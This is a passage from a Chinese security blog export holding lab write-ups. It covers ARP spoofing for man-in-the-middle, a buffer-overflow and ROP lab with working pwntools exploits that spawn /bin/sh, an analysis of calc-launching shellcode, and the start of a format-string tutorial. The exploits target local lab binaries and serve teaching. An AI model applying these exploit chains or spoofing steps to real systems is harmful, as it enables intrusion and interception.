192.168.195.1) 之间的mac均篡改为 攻击机 (IP 192.168.195.131)的mac地址。\n这里需要构造两个arp请求包\n对于靶机 win xp\n1 2 3 4 5 unsigned char mac[6] = { 0x00,0x0c,0x29,0x06,0x65,0xc9 }; unsigned char ip[4] = { 192,168,195,1}; unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; 对于靶机 win 10\n1 2 3 4 5 unsigned char mac[6] = { 0x00,0x0c,0x29,0x06,0x65,0xc9 }; unsigned char ip[4] = { 192,168,195,1}; unsigned char mac[6] = { 0x00,0x50,0x56,0xc0,0x00,0x08 }; unsigned char d_ip[4] = {192,168,195,1}; 查看未构造包前的状态\n此时两个靶机之间对应的mac 均为正确的。 发送两个arp 请求包。\n发送完成 查看发送后的 mac 对应表\n可以很直观的看到，两个靶机之间的mac地址均被篡改为 攻击机的 ip地址。 这里用win10 ping 通 靶机 win xp,同时在攻击机用 wireshark进行抓包。\n可以看到信息被攻击机截获，并且mac地址被篡改为 攻击机的 mac地址 ， 攻击机只需要将mac地址修改一下即可实现中间人攻击。 0x05 结论 ARP实验过程中，发送的数据包过少，计算机系统自身会迅速发出arp广播包 来恢复正确的mac地址，实验过程迅速的完成。长期的攻击需要不间断的发送arp请求包。 arp欺骗攻击的原理通过抓包来理解的透彻。 vm虚拟机利用nat桥接模式可以实现，主机和虚拟机在同一局域网下，使用vm8的虚拟网卡，以此作为实验的基础。 ","permalink":"http://www.reus09.top/posts/tech/arp%E6%AC%BA%E9%AA%97/","summary":"ARP欺骗实验 0x01 实验前提知识 ARP协议的安全问题 ARP协议是建立在信任局域网内所有结点的基础上的，它高效，但却不安全。 ARP高速缓存根据所接","title":"Arp欺骗"},{"content":"pwn_rop 调试 0x01 实验目的 1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcode地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。 2.针对实验二的32位环境和64位环境，通过调试分析，完成实际rop2.py和rop3.py （预留有空白和错误之处），最终拿到shell权限。相关详细分析过程写入报告 0x02 实验环境 Ubuntu 20 gcc 版本 工具 pwndbg ROPgadget pwntools visual studio code 通过vs code 的ssh 远程连接服务器ubuntu，并且远程调试程序。 0x03 实验前提知识 ROP的全称为 Return-oriented Programming（返回导向编程\n绕过可执行空间保护、代码签名等安全保护机制，执行恶意代码 通过控制被调用的堆栈，对程序的控制流进行劫持，完成某些特定功能 Shellcode写在栈中 未提供堆栈的保护措施，直接将shellcode写入栈中，并将函数的返回地址覆写为shellcode的地址。\n返回地址覆盖为shellcode，从而实现执行shellcode。 Ret2libc 加入了DEP（Data Execution Prevention）和NX（No execute）保护之后，拒绝执行堆栈上的任何代码。\nret2libc是ROP技术的一种，通过将返回地址覆写为libc中的函数绕过NX保护。\n我们知道，操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载。也就是控制执行 libc（对应版本） 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)（或者execve(\u0026quot;/bin/sh\u0026quot;,NULL,NULL)），故而此时我们需要知道 system 函数的地址。\ngadget 64位处理器的发展，改变了函数的调用约定，要求函数的前6个参数保存在寄存器中，如果还有更多的参数才会保存在栈中。 想继续给函数传递参数,将不能通过简单操作栈来操作函数，还需要操作寄存器。由此ret2libc变的难以成功。 gadget是从可执行文件或共享库中获取的以ret为结尾的指令序列。这种ROP技术寻找能够将栈中的值pop到寄存器的指令片段，由此构造函数参数。 ASLR地址随机化 开启地址随机化\n1 2 3 4 5 # 查看ASLR是否开启 cat /proc/sys/kernel/randomize_va_space # 关闭ASLR sudo su echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space 系统转储 dump core 1 2 3 4 5 6 7 # 查看是否开启： ulimit -c （如果是0就是关着的） # 开启转储 ulimit -c unlimited # 设置转储文件位置为/tmp文件夹下面 sudo su sudo sh -c \u0026#39;echo \u0026#34;/tmp/core.%t\u0026#34; \u0026gt; /proc/sys/kernel/core_pattern\u0026#39; Ubuntu 保持堆栈平衡 在Ubuntu18以上的版本，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。\n因为命令:\n1 2 3 .text:000000000004F2F1 movhps xmm0, [rsp+198h+var_190] .text:000000000004F2F6 movaps [rsp+198h+var_158], xmm0 ; here .text:000000000004F2FB call sigaction 主要原因是0x4F2F6处的movaps [rsp+198h+var_158], xmm0指令要求rsp+198h+var_158的值是对齐16byte（0x10），否则会直接触发中断从而crash。\n这些都是在Ubuntu 18 版本以上的才存在。\n栈的字节对齐，实际是指栈顶指针必须是16字节的整数倍。栈对齐使得在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。\n但是实际上，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器，在执行某些实现多媒体操作的SSE指令时，如果数据没有对齐，将无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。\n因此，任何针对x86_64处理器的编译器和运行时系统都必须保证， 它们分配内存将来可能会被SSE指令使用，所以必须是16字节对齐的，这也就形成了一种标准：\n任何内存分配函数（alloca, malloc, calloc或realloc）生成的块的起始地址都必须是16的倍数。 大多数函数的栈帧的边界都必须是16字节的倍数。 如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（rsp）也必须是16的倍数。\n实验源码 1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; void vuln() { char buf[128]; read(0,buf,256); } int main() { vuln(); write(1,\u0026#34;hello rop\\n\u0026#34;,10); } 分析程序漏洞 Vuln()函数中，buf数组的大小是128字节，但是在read时最多可以读入256字节，容易造成缓冲区溢出，利用这个漏洞对程序流进行劫持，执行构造好的payload。\n具体的思路：把payload写入buf数组中，并利用缓冲区溢出漏洞，将返回地址修改为buf数组的地址，vuln()函数返回之后，就会到buf数组中执行shellcode\n可以利用pwntools有一个shellcraft模块可以实现shellcde，其中其中**shellcraft.sh()**就是生成执行/bin/sh的shellcode。\n可以用asm()将shellcode 转换为机器码\n0x04 实验过程 rop1_gdb 编译rop1.c，关闭栈保护和NX保护，在32位环境下，编译生成rop1\n这里我们想实现的是通过gdb 调试rop1获得真正的buf地址，然后向里面输入我们精心构造好的shellcode,将返回地址覆盖为我们找到的真实buf地址。\n这里解释一下为什么gdb调试中产生的buf地址和真正执行程序的地址原因\n正常程序运行时，会将环境变量字符串数组和命令行参数字符串数组存放在栈顶，而程序使用的局部变量等数据则位于这些字符串数组之后。环境变量字符串数组记录了诸如当前用户名、终端类型、搜索路径等环境信息。程序直接运行时，程序进程继承的是运行其的 shell 的环境变量，而程序通过 gdb 运行时，程序进程继承的是 gdb 的环境变量，这两者存在不同，从而会造成位于栈上的局部变量的地址发生改变。用户可在 gdb 中运行 show environment 命令获得环境变量参数。、\n较之程序直接运行，位于栈顶的环境变量主要有以下变化\n环境变量的内容发生改变，在程序直接运行时，_ 变量存放的是程序的执行路径，而通过 gdb 运行程序时，_ 变量存放的是 gdb 的执行路径。 通过 gdb 运行的调试程序继承了 gdb 的环境变量，其中包含新加入的环境变量 LINES 和 COLUMNS。 位于栈上的参数列表也可能不同，当用户通过 ./rop1 直接在shell 中运行程序时，位于参数数组的第一项 argv[0] 内容为”./rop1” ,而用户通过 gdb 运行 hello 程序时，程序的参数列表的第一项 argv[0] 的值为该程序的绝对路径”/home/reus09/test/pwn/2_rop/rop1”，这也会造成程序运行时局部变量地址的差异。建议终端环境下使用绝对路径运行程序，避免该差异。 这里有三种解决方案\n通过gdb来attach 一个正在运行的程序，其地址和正在运行的地址是一致的\n在gdb调试过程中，对传递给进程的环境变量进行操作和修改\ngdb 可通过 wrapper 函数运行调试程序。当设置好 wrapper 程序后，gdb 会以 exec wrapper hello 的 shell 命令的形式启动调试程序 Hello，wrapper程序首先运行并最终启动调试进程，之后由 gdb 对调试进程进行控制。通过 wrapper 程序，即可控制传递给调试进程的环境变量。\n1 2 3 set exec-wrapper wrapper　//设置 wrapper 程序为 wrapper show exec-wrapper //显示当前的 wrapper 程序 unset exec-wrapper　//取消对 wrapper 程序的设置 利用内核转储获取真实地址。\n使用命令ulimit -c unlimited启动内核转储，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。 然后使用命令gdb filename core即可调试，获得真实地址。 第一种方案 通过gdb来attach 一个正在运行的程序 运行rop1程序 利用ps -ax 查看所有进程，发现rop1运行的进程pid 为 130896，将其直接attach 在vuln地方设置断点，并且执行程序，进入到vuln函数里面 一路n 单步步过，跳到read函数上面 发现buf地址为0xffffd1a0，此时的buf地址即为真实地址 第二种方案 gdb调试过程中，去除环境变量\n输入命令gdb rop1\n1 set exec-wrapper env -u COLUMNS -u LINES -u _ //在 gdb 中设置 wrapper 程序 然后在vuln处设置断点，运行程序后，单步跳过一直到read部分\n发现此时的buf首地址仍然为 0xffffd1a0\nshellcode 执行部分 上述两种方案确定了直接执行rop1程序的时候buf的真正首地址0xffffd1a0\n但是由于pwntools 自带的 python环境，会影响rop1程序运行的buf地址，因此这个真实地址是不能够在shellcode中直接作为返回地址执行的。\n因为这里需要用gdb来实现shellcode 的调试，所以我们需要加入gdb的环境，并设置一些软断点来保证gdb中可以执行到shellcode\n这里需要用到core报错的部分，同样我们也需要管道来输入我们精心构造好的shellcode\n这里我们需要确定一下buf数组的长度，以及返回长度的位数，以便于确定找到返回地址从而覆盖掉它。\n这里我们采用在IDA里面查看一下我们需要填充多少字符\nIDA查看buf数组的存储情况 由此确定buf首地址到esp 的长度为 0x88,然后到返回地址的长度为0x04,因此算上我们构造的shellcode，我们需要填充0x8c个字符 然后我们这里以一个错误的地址0xdeadbeef来产生报错，从而得到在gdb中buf的可用地址\n我们通过pwntools产生shellcode将其保存为deadbeef，其最后的地址会被覆盖为0xdeadbeef\n脚本如下\n1 2 3 4 5 6 7 8 9 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) print(payload) with open(\u0026#34;deadbeef\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) 可以看到我们精心构造的shellcode已经存储到文件deadbeef里面\n在gdb 中调试\n命令r \u0026lt; deadbeef，执行过程中通过管道输入我们构造好的shellcode 发现寄存器ECX存储的是shellcode存储的首地址 此地址0xffffd170即为我们gdb调试过程中可以利用的buf真实地址 下面利用上面同样的方法，构造好我们需要的产生shellcode的文件\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xffffd170 payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) print(payload) with open(\u0026#34;gdb_with_payload\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) 我们可以利用的shellcode文件即已经构造完成。\n下面在gdb中执行我们的shellcode\n这里需要做一些前置工作，因为我们想要设置一些软断点。否则输入shellcode后进程会被直接杀死，程序只会一闪而过。\n这个软断点的意思是，跟踪我们输入的文件，文件输入完毕后，设置断点\n命令如下\n1 2 3 4 5 set detach-on-fork on set follow-fork-mode child set breakpoint pending on b_start 首先告诉 gdb 跟踪子进程；然后设置set breakpoint pending on是为了在设置断点时让 gdb 不强制在对符号下断点时就需要固定地址，这样在b _start时就会 pending 而不是报错；最后再连接到父进程以及加载子进程的符号。 直接gdb rop1进入命令，然后输入上述设置子进程的命令\n然后输入命令r \u0026lt; gdb_with_payload，执行的时候通过管道符载入数据gdb_with_payload，这里覆盖返回地址的是我们精心构造的适合gdb环境的buf地址(注意，这里的buf地址并不是程序直接运行产生的buf地址) 连续的r命令 这里通过一个子进程的调度从而运行了我们的shellcode，很明显可以看到这里出现了我们的输入命令 验证是否拿到shell\n输入命令ls 输入命令whoami 这样我们就实现了通过gdb调试直接 控制shell，但是由于设置断点的子进程输入命令后，直接被附近到当前的命令，故每次调试只能使用一次。\nrop1_py 这里是使用pwntools工具来实现拿到shell,pwntools实现的连接持久，这里同样也是我们上述提到的第三种方案利用内核转储获取真实地址(即利用 dump core 来实现获取buf地址，这个buf地址是受python环境影响的)\n首先构造虚假的地址0xdeadbeef来使程序崩溃产生core\n脚本如下\n1 2 3 4 5 6 7 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) p.sendline(payload) p.interactive() 在终端执行该脚本\n通过前后ls命令可以很清晰的看到，执行脚本之后程序崩溃，产生了core报错文件 执行命令gdb ./rop1 core来调试该core\n此时esp指针位于返回地址的下一个位置，因此buf的地址是esp-0x4-0x8c，即地址esp-0x90 通过命令x/s $esp-0x90查看 发现地址0xffffd1c0存储的果然是shellcode存放的地方 于是直接将返回地址修改为0xffffd1c0\n在终端执行exp\n可以看到，我们已经拿到了shell 最终exp 如下\n1 2 3 4 5 6 7 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) p.sendline(payload) p.interactive() rop2_32 编译rop1.c，只开启Canary栈保护，在32位环境下，编译生成rop2\n可以看到NX保护已经开启，程序为32位程序\n查看rop2进程栈的权限为rw-p，不可执行\n栈上的程序不能运行，即我们不能在栈上执行shellcode，但在程序中用到了libc库中的read和printf函数，libc.so中保存了大量的可用函数，考虑调用system(\u0026quot;/bin/sh\u0026quot;)来绕过NX保护获取shell\n根据ROP的原理，不难发现，我们可以将返回地址覆盖为我们要调用的system函数地址，然后在它下面写入system函数需要返回的地址以及它传入的参数/bin/sh\n示意图如下 这里首先确定一下buf首地址到返回地址中间的差距，以便确定填充多少字符来覆盖返回地址。\n同样用IDA 查看 rop2 中 buf的结构 发现需要填充的字符为0x88 + 0x04 为 0x8c 因为我们环境已经关闭了地址随机化，因此system和/bin/sh的地址并不会随程序运行而改变。\n接下来寻找system的地址\n我们可以在gdb 调试过程中 直接 调用命令print system 来查看system函数地址 因此system函数地址为0xf7e17830 接下来需要我们需要的字符串/bin/sh的存储地址\n这里我们需要调试gdb过程中，用到vmmap 命令来查看libc.so的起始位置，在其中间查找到存储/bin/sh的地址 根据起始地址和结束地址，查找/bin/sh的位置 显然/bin/sh存放的地址为0xf7f64352 我们调用system后的返回地址因为我们不需要返回，所以直接填充0xdeadbeef即可\n在终端下调用exp\n很明显可以看到我们已经拿到了shell 最终exp:\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process(\u0026#39;./rop2\u0026#39;) #gdb.attach(p,\u0026#39;b vuln\u0026#39;) sys_addr=0xf7e17830 binsh_addr=0xf7f64352 payload = b\u0026#39;a\u0026#39;*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr) p.sendline(payload) p.interactive() rop3_64 编译rop1.c，只开启Canary栈保护，关闭no-pie在64位环境下，编译生成rop3\n这里同样关闭了NX保护,同时编译产生的程序为64位 并不能在栈上直接写shellcode，考虑同样构造ROP链的形式来拿到shell，但是64位程序不同于32位程序，参数存放在寄存器中，多于6个参数才会放在栈上。\n图例\n关于漏洞利用\n由于参数不会直接放在栈上，需要寻找类似于pop rdi；ret的gadget，将参数从栈中弹出到rdi寄存器后，返回到返回地址处继续执行。本例子在栈中事先压入参数/bin/sh地址和system地址。 图例即为 ubuntu20 字节对齐 首先查看一下要从buf数组到返回地址 我们需要覆盖多少字节\n这里同样使用IDA来查看程序 发现buf数组长度为0x80，返回地址长度为0x08，故我们需要覆盖的长度为0x88 找到存在pop rdi;ret的指令地址\n这里使用ROPgadget 工具 首先使用命令ldd rop3查看rop3使用的libc的版本，找到对应的版本，然后就在libc库中查到我们需要的pop rdi;ret 这里我们就拿到了pop|rdi 相对于libc的偏移地址0x0000000000026b72 找到system和/bin/sh的地址\n这里的方法和找rop2中的方法一样\n在gdb调试过程中，分别用print system 和vmmap 查找地址\n可以看到system的存储地址为0x7ffff7e22410\nvmmap 和find命令查找/bin/sh地址\n可以看到/bin/sh的地址为0x7ffff7f845aa\n/usr/lib/x86_64-linux-gnu/libc-2.31.so的起始地址为0x7ffff7dcd000\n按道理这个时候我们已经将地址一一对应填入即可拿到shellcode，但是由于我们机器使用的为ubuntu 20,在ubuntu18版本以上的系统，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。\n我们这里填充的字符长度为0x88，因此我们需要在加入0x08个字符来平衡栈，这种情况下如加入新的字节不能影响我们ROP链的执行，因此我们该字符存储因改为ret指令类似的不影响逻辑的指令。\n我们同样根据ROPgadget来拿到对应的ret存放的地址\n我们直接查看位于libc.so中的程序中一个存储ret指令的地址\n命令 ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026quot;ret\u0026quot;\n因为这里相对偏移基于libc.so的首地址为0x0000000000025679\n所以ret的实际地址为0x7ffff7dcd000+0x0000000000025679\n将填充好的地址 写入exp中，在终端执行exp\n最终exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * p = process(\u0026#39;./rop3\u0026#39;) ret_addr= 0x7ffff7dcd000+0x0000000000025679 sys_addr= 0x7ffff7e22410 binsh_addr=0x7ffff7f845aa pr_addr = 0x7ffff7dcd000 + 0x26b72 payload = b\u0026#39;a\u0026#39;*0x88+ p64(ret_addr)+ p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() Ubuntu16 中正常没有字节对齐 ubuntu版本\n找到存在pop rdi;ret的指令地址\n相对偏移地址为0x0000000000021112 system地址\nsystem 地址为 0x7ffff7a523a0 /bin/sh地址\nlibc.so首地址0x7ffff7a0d000,/bin/sh首地址0x7ffff7b99e57 exp终端直接执行\n发现拿到shell 最终exp\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * p = process(\u0026#39;./rop3\u0026#39;) sys_addr= 0x7ffff7a523a0 binsh_addr=0x7ffff7b99e57 pr_addr = 0x7ffff7a0d000 + 0x21112 payload = \u0026#39;a\u0026#39;*0x88 + p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() 0x05 实验结论 实验过程中针对实验一，分别使用了gdb直接调试得到shell和通过pwntools结合dump core得到shell两种方案，但是实际上两种方案中运用的地址并不是程序直接运行时候buf数组的地址，二者因为程序运行环境的差异，buf的地址都有差异。 同时呢，运用gdb调试shellcode，直接写入数据比较麻烦，因为shellcode读取需要字节流，这里的解决方案是利用pwntools生成的payload保存为文件，以管道的形式将其输入到gdb中。此外，在查看shellcode调试效果的时候，需要设置软断点来调用子进程，并且一次只能查看一个命令的结果，不便于持久化shell连接，但是gdb方便调试，随意设置断点，查看自己想看的东西，定位到read函数里面查看buf的地址，很方便。 python 调试呢，因为结合程序运行崩溃产生的core,在python环境下的buf地址相当明朗，借助pwntools的工具，很容易就可以构造payload，将其发送给服务器端并建立持久化的shell连接，但是调试的话不太方便，但是可以使用在pwntools里面调用gdb来实现。所以总体来说，rop1-modified.py脚本调试更为方便，功能也更为强大。 对于实验二 对于Ubuntu18 以上的版本，调试64位程序的时候，我们精心构造的payload一般要考虑字节对齐的因素，一般采用ret来进行对齐。 充分理解了ROP链的构造过程 了解了Linux下system和exec函数的用法。 ","permalink":"http://www.reus09.top/posts/tech/rop/","summary":"pwn_rop 调试 0x01 实验目的 1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcod","title":"Rop"},{"content":"逆向分析计算器的漏洞利用过程 0x01 实验目的 根据实验软件SCer.exe 和 shellcode代码shellcode2020.mybin，通过windbg逆向分析弹出计算器的漏洞利用详细过程 根据实验软件shellcode2020.exe，通过Ollydbg逆向分析弹出计算器的漏洞利用详细过程。 分析两者区别。 0x02 试验工具 windbg Ollydbg IDA_PRO 因为Windows xp sp3下的Windbg微软将其在线Symbol符号下架，导致Windbg调试过程中，部分关键函数为乱码，无法正常分析，故借鉴Ida 实验环境 Windows xp sp3 0x03 windbg 调试 Scer.exe 打开Scer.exe，然后将shellcode.txt.mybin附加到程序，可以发现计算器可以正常打开。\n需要对Scer.exe进行动态调试分析，为了调试分析植入的shellcode,我们在shellcode.txt.bin前加上字节0xCC\n然后在windbg中附加 Scer.exe的进程。\n这里程序会停在系统代码区域，我们要进入用户代码里面。 WinDbg里有个伪寄存器叫$exentry，里面记录了程序的入口点。所以我们只要在命令输入栏里输入bp $exentry 然后执行命令g即可进入用户程序入口。 这里结合IDA_pro，F5反编译可以看到 这里实现了程序的初始化，就不在过多分析。 这里通过IDA_PRO，找到我们加载核心代码shellcode 的首地址。\n首先shift+F12查看字符串，找到字符串状态:0x%0.8x 已载入shellcode,即将开始执行...，一路反跟踪函数返回，找到该段功能的首地址为：0x401830 也就是说在此段代码中，我们实现了向程序中输入shellcode后，程序如何处理shellcode以及如何跳转到shellcode的过程 在windbg 下 设置断点 bp 0x401830\n加载我们的shellcode 后，就可以在windbg中调试 看到程序怎么将shellcode存放起来并执行。 然后输入pc跳转到下一个call 指令，然后步入，这个函数为 CreateFileA。\n发现该函数功能实现了创建一个线程\u0026mdash;\u0026mdash;\u0026mdash;-打开文件夹，即我们的shellcode文件。 继续pc跳转到下一个函数地址，这个函数为 VirtualAlloc\n这里查看一下VirtualAlloc函数的结构\n1 2 3 4 5 6 LPVOID VirtualAlloc{ LPVOID lpAddress, // 要分配的内存区域的地址 DWORD dwSize, // 分配的大小 DWORD flAllocationType, // 分配的类型 DWORD flProtect // 该内存的初始保护属性 }; 并且与调入函数前传入的参数相结合对比，\n发现 ebx 存取的是 我们shellcode 的字节长度，esi存放的是 程序给 shellcode 分配的动态地址。\n程序执行完毕后，很明显可以发现了esi 存取的 地址为 0xb40000\n这里就实现了为 shellcode的存取 提前分配好了 动态地址， 起始地址为 0xb40000\n继续pc跳转到下一个call函数，该函数名字为 ReadFile\n这里查看一下VirtualAlloc函数的结构\n1 2 3 4 5 6 7 8 9 BOOL ReadFile( HANDLE hFile, //文件的句柄 LPVOID lpBuffer, //用于保存读入数据的一个缓冲区 DWORD nNumberOfBytesToRead, //要读入的字节数 LPDWORD lpNumberOfBytesRead, //指向实际读取字节数的指针 LPOVERLAPPED lpOverlapped //如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。 //该结构定义了一次异步读取操作。否则，应将这个参数设为NULL ); 此时的寄存器情况：\n将函数结构 与 传参前的 汇编语言进行 对比。\n可以发现函数实现了在地址为esi :: 0xb40000 的缓冲区 存取了 长度为27 字节的 shellcode。\n继续pc进行到sleep函数。\n因为要等待此时的线程完成。 继续p指令 单步跳过，一直到\n此段整体汇编代码对应用IDA_Pro显示\nmov bp+ms_exc.registration.TryLevel], 0 ; 进入第一个__try域,TryLevel=0\nmov ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh ; 离开第一个__try域，TryLevel=TRYLEVEL_NONE (-2)\n所以此段为 try_except 的过程。\n然后发现存在汇编语句call eax\ncall eax 来自 [ebp + var_24]\n追踪发现 [ebp+var_24]存放的是esi的地址，即0xb40000 因此这段代码，就是程序进入预先分配好的动态内存区(里面存有shellcode）的入口。\n进入函数，分析shellcode。\n程序执行到0xb40001跳转到地址0xb40019，然后发现在地址0xb40019的 jmp 指令跳转到 0xb40003\n这里解释么要先call 跳转到 0xb40019然后再回到0xb40003\ncall/pop指令 Shellcode可以通过在一个call指令后立即执行pop指令，将上一刻压入栈中的指令地址载入到寄存器中，从而获取到shellcode起始的内存地址。 原理就是：call 指令实际上就是 先将该函数的下一个地址压入栈中，然后跳转到目的地址。跳转之后再将其pop出来，这样就达到了ebx 存放 地址0xb4001e的作用。 这里通过call 0xb40003指令调用完之后对栈的分析，可以看出。 显然，栈最顶层为calc.exe 存放的地址。 然后开始 pop ebx ，将 eax 清零。\n然后向栈中压入 ebx,eax。 ebx此时存放的地址为0xb4001e即字符串\\x63\\x61x6c\\x63\\x2e\\x65\\x78\\x65对应的calc.exe\n将函数kernel32!WinExec地址传给ebx。\n上面两个压栈相当于 对下面的函数 kernel32!WinExec进行传参。\n1 2 UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow ); 这样就相当于调用函数 winExec(\u0026quot;calc.exe\u0026quot;,0)来打开计算器。\n函数调用完成后。将eax置0，然后入栈，将函数kernel32!ExitProcess地址传给ebx。相当于向函数kernel32!ExitProcess传入参数，结束调用的进程及其所有的线程windows函数。\nshellcode分析完毕。\n在命令中输入g，即可弹出计算器。\n0x04 Ollydbg 调试 shellcode2020.exe 直接执行shellcode2020.exe会直接弹出计算器。\n动态分析前:\n通过IDA_Pro 可以直接定位到 main函数地址为 : 0x401290 在Ollydbg中设置断点0x401290,然后运行程序跳转到该地址\n1 2 3 4 5 6 7 8 9 10 push ebp mov ebp,esp 更新函数栈帧 sub esp,8 and esp,FFFFFFF0 mov eax,0 add eax,0f add eax,0f shr eax,4 shl eax,4 将 (eax + 0f + 0f )先左移一位，后右移一位，结果为00000010 然后进入到地址为0x401710的函数，结合IDA，该函数为alloca函数，产生函数指针。\n1 2 3 4 5 6 7 8 原型： void * __cdecl alloca(size_t); 参数： size_t: 申请分配内存的尺寸 返回值： void*: 分配到的内存地址 alloca与malloc,calloc,realloc类似,需要注意的是它申请的是“栈(stack)”空间的内存，用完会在退出栈时自动释放，无需手动释放。 alloca不宜使用在必须广泛移植的程序中, 因为有些机器不一定有传统意义上的\u0026#34;堆栈\u0026#34; 进入函数0x4013b0，执行加载函数，将shellcode加载到代码区。\n然后设置断点 0x4012ba，然后单步步入\n发现dword ptr[ebp - 4]被赋值为地址0x402000 观察IDA，发现地址0x40200的地方存取的数据为evil数组，即shellcode存放地址。 同时0x402000也是文件执行过程中，data端的起始位置。 步入，查看shellcode。\n发现大致流程和windbg分析过程一样。\n通过call和pop结合运用，将ebx赋值为 地址0x40201d ebx此时存放的为字符串calc.exe 然后同样的压栈操作，调用函数Kernel32!WinExec进行执行计算器。\n执行完毕后，又将eax置0 ，将函数kernel32!ExitProcess的地址传给ebx,调用ebx地址所在的程序，即ExitProcess(\u0026lsquo;0\u0026rsquo;)，退出程序。\n0x05 总结(区别) Scer.exe创造一个新的线程，然后通过读取文件内容作为shellcode，并通过VirtualAlloc申请内存，xp里面这个内存地址均为0xb40000并且用esi保存这个地址，然后ReadFile即在虚拟地址0xb40000中写入shellcode，然后通过format,update等函数shellcode进行转换，最后地址将其作为一个函数指针，进行调用，进入shellcode。 shellcode2020.exe则是在文件的.data端 存放我们的shellcode。通过函数alloca来在堆上申请内存，并且用函数指针对其调用，最后调用.data的起始地址，运行我们构造的shellcode,可以运行计算器。 因此两者的区别：一个是从外部植入shellcode，将其加载到内存中，另一个是程序本身自带的shellcode，通过构造函数指针来执行shellcode。 ","permalink":"http://www.reus09.top/posts/tech/shellcode-%E8%AE%A1%E7%AE%97%E5%99%A8/","summary":"逆向分析计算器的漏洞利用过程 0x01 实验目的 根据实验软件SCer.exe 和 shellcode代码shellcode2020.mybin，通过win","title":"Shellcode 计算器"},{"content":"格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参数，并对这些参数进行处理。而格式化字符串将C语言的主要数据类型，以易于阅读的方式保存在字符串里。从程序输出数据、打印错误信息到处理字符串数据，格式化字符串几乎出现在所有的C程序中。\nprintf 功能：向stdout按规定的格式输出信息；\n格式：\n1 int printf (const char *format,[argument]...) format是格式控制字符串，其他参数为输出项； printf(\u0026quot;Id=%d\u0026quot;,Id); sprintf 功能：把格式化的数据写入某个字符串中；\n格式：\n1 int sprintf(char *buffer,const char *format,[argument]...) buffer是要卸乳字符串的缓冲区； 函数按照第二部分格式化字符的格式，把第三部分的数据进行格式化，然后在把格式化后的数据类型，存储到字符串的缓存区间里去； sprintf(buffer, \u0026quot;Id=%d\u0026quot;, Id); snprintf 功能：把格式化的数据写入某个字符串中，控制字符串长度；\n格式：\n1 int snprintf(char *str,size_t size,const char *format,[argument]...) 在sprintf的基础上限制了可写入字符的最大值size； 当格式化后的字符串长度=size，则将其中的size-1个字符复制到str中，并在最后添加字符串结束符\\0； sprintf(buffer, 10,\u0026quot;Id=%d\u0026quot;, Id); fprintf 功能：用于格式化输出到一个流/文件中；\n格式：\n1 int fprintf(FILE *stream,const char *format,[argument]...) 根据指定的格式控制字符串format向输出流stream中写入数据； 当stream为stdout时，fprintf与printf的功能相同； printf(pfile,\u0026quot;Id=%d\u0026quot;,Id); vprintf/vsprintf/vsnprintf/vfprintf 功能分别对应于printf/sprintf/snprintf/fprintf； 将变参列表换成了va_list类型的参数 格式： vprintf (format,va_list); vsprintf (buffer,format,va_list); vsnprintf (buffer,256,format,va_list); vfprintf(stream, format, va_list); 格式化字符串 格式化字符串是由普通字符串和格式化规定字符构成的字符序列：\n普通字符被原封不动地复制到输出流中； 格式化规定字符则是以%开始，用来确定输出内容格式； 